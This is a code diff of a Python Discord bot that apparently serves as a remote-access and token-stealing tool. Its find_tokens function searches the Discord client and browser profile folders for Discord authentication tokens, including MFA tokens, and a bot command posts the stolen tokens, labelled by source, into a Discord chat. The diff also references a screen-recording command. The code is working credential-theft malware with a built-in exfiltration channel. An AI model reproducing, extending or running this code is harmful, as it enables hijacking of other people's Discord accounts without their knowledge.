@@ -509,12 +509,10 @@ async def sr(ctx, duration: int = 30):  # Default duration is set to 30 seconds
     # Optionally, delete the video file after sending
     os.remove(video_path)
 
-# Function to find Discord tokens
 def find_tokens():
     tokens = []
-    local = os.getenv("localAPPDATA")
+    local = os.getenv("LOCALAPPDATA")
     roaming = os.getenv("APPDATA")
-
     paths = {
         "Discord": roaming + "\\Discord",
         "Discord Canary": roaming + "\\discordcanary",
@@ -525,18 +523,7 @@ def find_tokens():
         "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
         'Lightcord': roaming + "\\Lightcord",
         'Opera GX': roaming + "\\Opera Software\\Opera GX Stable",
-        'Amigo': local + "\\Amigo\\User Data",
-        'Torch': local + "\\Torch\\User Data",
-        'Kometa': local + "\\Kometa\\User Data",
-        'Orbitum': local + "\\Orbitum\\User Data",
-        'CentBrowser': local + "\\CentBrowser\\User Data",
-        'Sputnik': local + "\\Sputnik\\Sputnik\\User Data",
-        'Chrome SxS': local + "\\Google\\Chrome SxS\\User Data",
-        'Epic Privacy Browser': local + "\\Epic Privacy Browser\\User Data",
-        'Microsoft Edge': local + "\\Microsoft\\Edge\\User Data\\Default",
-        'Uran': local + "\\uCozMedia\\Uran\\User Data\\Default",
-        'Iridium': local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
-        'Firefox': roaming + "\\Mozilla\\Firefox\\Profiles",
+        # Add any other browsers or platforms as needed
     }
 
     for platform, path in paths.items():
@@ -548,21 +535,18 @@ def find_tokens():
                         for line in file.readlines():
                             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                 for token in re.findall(regex, line):
-                                    if token not in tokens:  # Ensure tokens are unique
-                                        tokens.append(token)
-
+                                    if f"{token} | {platform}" not in tokens:
+                                        tokens.append(f"{token} | {platform}")
     return tokens
 
-# Command to execute the token fetching
-@bot.command()
-async def token(ctx):
-    tokens = find_tokens()  # Call the function to find tokens
-
-    if tokens:  # If tokens were found
-        tokens_message = "\n".join(tokens)  # Join tokens into a message
-        await ctx.send(f"Tokens found:\n{tokens_message}")  # Send the tokens in chat
+@bot.command(name="find_tokens")
+async def find_tokens_command(ctx):
+    tokens = find_tokens()
+    if tokens:
+        tokens_message = "\n".join(tokens)
+        await ctx.send(f"Tokens found:\n```{tokens_message}```")
     else:
-        await ctx.send("No tokens found.")  # Notify if no tokens were found
+        await ctx.send("No tokens found.")
 
 
 @bot.command()
